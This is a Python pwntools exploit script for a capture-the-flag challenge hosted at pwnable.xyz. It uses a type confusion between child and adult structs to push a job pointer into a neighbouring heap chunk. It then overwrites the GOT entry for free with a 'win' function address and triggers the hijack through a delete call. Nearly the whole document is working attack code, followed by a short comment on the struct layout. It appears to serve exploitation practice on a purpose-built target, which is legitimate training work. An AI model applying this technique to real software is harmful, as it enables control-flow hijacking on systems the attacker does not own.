from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process(e.path)
p = remote('svc.pwnable.xyz', 30038)

def create_adult(age, name, job):
	p.sendlineafter(b'>', b'1')
	p.sendlineafter(b'Age:', str(age).encode())
	p.sendafter(b'Name:', name)
	p.sendafter(b'Job:', job)

def create_child(age, name, job):
	p.sendlineafter(b'>', b'2')
	p.sendlineafter(b'Age:', str(age).encode())
	p.sendafter(b'Name:', name)
	p.sendafter(b'Job:', job)

def ageup(idx):
	p.sendlineafter(b'>', b'3')
	p.sendlineafter(b'Person: ', str(idx).encode())

def transform(idx, name, job):
	p.sendlineafter(b'>', b'5')
	p.sendlineafter(b'Person: ', str(idx).encode())
	p.sendafter(b'Name: ', name)
	p.sendafter(b'Job: ', job)

def delete(idx):
	p.sendlineafter(b'>', b'6')
	p.sendlineafter(b'Person: ', str(idx).encode())

create_child(18, b'A'*8, b'B'*8)
create_adult(80, b'A'*8, b'B'*8)

ageup(0)

transform(0, b'C'*8, b'D'*8) # town[0] child -> adult

for i in range(0x30): # adult->job_pointer increase & adult->job_pointer pointing next chunk (town[1]->name)
	ageup(0)

transform(0, b'E'*8, b'5') # buffering

# now town[0]->job_pointer : town[1]->name
p.sendlineafter(b'Person: ', b'0')

p.sendafter(b'Name: ', b'F'*8)
p.sendafter(b'Job: ', p64(e.got['free']))

transform(1, p64(e.symbols['win']), b'G'*8)

delete(0) # trigger

p.interactive()

'''
Adult Struct

name pointer | type (1 : child, 2: adult)
age          | job pointer

Child Struct

name pointer | type (1 : child, 2: adult)
job pointer  | age

name (0x10)
job (0x20)

'''